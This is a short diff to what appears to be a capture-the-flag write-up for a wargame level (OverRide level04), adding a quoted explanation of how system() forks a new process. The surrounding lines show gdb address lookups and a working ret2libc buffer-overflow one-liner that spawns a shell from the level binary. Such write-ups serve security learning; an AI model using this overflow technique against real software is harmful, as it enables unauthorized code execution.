@@ -47,6 +47,10 @@ Exploit :
  (gdb) find &system,+9999999,"/bin/sh"    => 0xf7f897ec
  (gdb) p exit                             => 0xf7e5eb70
  
+ "The system( ) function works differently from the exec*( ) functions; instead of replacing the currently executing program, it creates a new process with fork( ).
+ The new process executes the shell with execve( ) while the original process waits for the new process to terminate. The system( ) function therefore does not r
+ eturn control to the caller until the specified program has completed"
+ 
  
 >$ level04@OverRide:~$ (python -c 'print("A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level04
    Give me some shellcode, k
